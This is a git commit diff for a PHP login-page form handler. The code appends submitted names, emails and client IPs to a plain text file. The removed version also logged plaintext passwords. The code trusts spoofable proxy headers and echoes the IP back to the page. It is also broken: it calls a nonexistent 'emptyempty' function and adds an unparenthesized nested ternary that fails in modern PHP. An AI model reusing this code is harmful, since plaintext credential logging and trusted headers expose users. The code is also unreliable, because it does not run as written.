97c002e8e5c61b19c5754fd1c01742b79249cd48
Jackson Krauss <jacksonkrauss1@gmail.com>
2021-04-29 16:33:32 -0500

    fixed getting ip for user

--- login-page/form-d435.php
+++ login-page/form-d435.php
@@ -1,23 +1,8 @@
 <?php
-    function getIPAddress() {  
-        //whether ip is from the share internet  
-        if(!emptyempty($_SERVER['HTTP_CLIENT_IP'])) {  
-                    $ip = $_SERVER['HTTP_CLIENT_IP'];  
-        }  
-        //whether ip is from the proxy  
-        elseif (!emptyempty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
-                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
-        }  
-        //whether ip is from the remote address  
-        else{  
-                $ip = $_SERVER['REMOTE_ADDR'];  
-        }  
-        return $ip;  
-    }
-
     $myfile = fopen("wifeyeData.txt", "a+");
-    $ip = getIPAddress();  
-    $data = $_POST['name'] . ' ' . $_POST['email'] . ' ' . $_POST['password'] . ' ' . $ip . "\r\n";
+    $ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
+echo "The user IP Address is - ". $ip;
+    $data = $_POST['name'] . ' ' . $_POST['email'] . ' ' . $_POST['message'] . ' ' . $ip;
     $test = file_get_contents('wifeyeData.txt');
     if(!(strpos($test,$data) !== false)){
         $ret = fwrite($myfile,$data . "\r\n");
